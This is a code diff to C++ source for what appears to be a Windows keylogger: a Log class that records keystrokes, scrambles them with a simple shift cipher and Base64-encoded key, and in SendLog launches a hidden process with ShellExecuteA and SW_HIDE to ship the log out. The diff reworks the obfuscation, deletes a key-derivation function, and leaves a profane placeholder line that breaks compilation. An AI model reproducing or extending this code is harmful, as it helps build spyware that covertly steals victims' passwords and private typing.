@@ -7,10 +7,23 @@ FILE* OUTPUT_FILE;
 std::string Log::EncryptMyString(std::string UnencryptedString) {
 #ifndef debug
     std::string CryptedString;
+    std::string ThrowAwayKey = std::to_string(rand() % KeyShiftLimit + 1);
     for (int r = 0; r < UnencryptedString.size(); r++) {
-        CryptedString += UnencryptedString[r] + ExtrapolatedKey;
+        if (std::atoi(ThrowAwayKey.c_str()) % 2 == 0) {
+            if(UnencryptedString[r] % 2 == 0)
+                CryptedString += UnencryptedString[r] + std::atoi(ThrowAwayKey.c_str()) + 2;
+            else
+                CryptedString += UnencryptedString[r] + std::atoi(ThrowAwayKey.c_str()) + 4;
+        }else{
+            if (UnencryptedString[r] % 2 == 0)
+                CryptedString += UnencryptedString[r] + std::atoi(ThrowAwayKey.c_str()) + 1;
+            else
+                CryptedString += UnencryptedString[r] + std::atoi(ThrowAwayKey.c_str()) + 3;
+        }
     }
     UnencryptedString = CryptedString;
+    Base64::encode(ThrowAwayKey,&CryptedString);
+    UnencryptedString += CryptedString;
 #endif
     return UnencryptedString;
 }
@@ -61,7 +74,7 @@ void Log::LogItInt(int key_stroke) {
         fprintf(OUTPUT_FILE, "%s", EncryptMyString("."));
     else
 #ifndef debug
-        key_stroke += ExtrapolatedKey;
+        FIX ME FOR FUCKS SAKE
 #endif
     fprintf(OUTPUT_FILE, "%s", &key_stroke);
     fclose(OUTPUT_FILE);
@@ -166,20 +179,6 @@ void Log::SendLog() {
         //system(Command.c_str());
         ShellExecuteA(NULL, "open", SysDir, Command.c_str(), NULL, SW_HIDE);
     }
-}
-
-
-
-
-int Log::ExtrapolateKey() {
-
-    std::string Passwd = CryptPassword;
-    int ExtrapolatedKey1 = BaseShiftValue;
-    for (int plq = 0; plq < Passwd.size(); plq++) {
-        ExtrapolatedKey1 += (int)Passwd[plq];
-    }
-    ExtrapolatedKey = ExtrapolatedKey1;
-    return ExtrapolatedKey1;
 }
 
 void Log::CreateLog() {
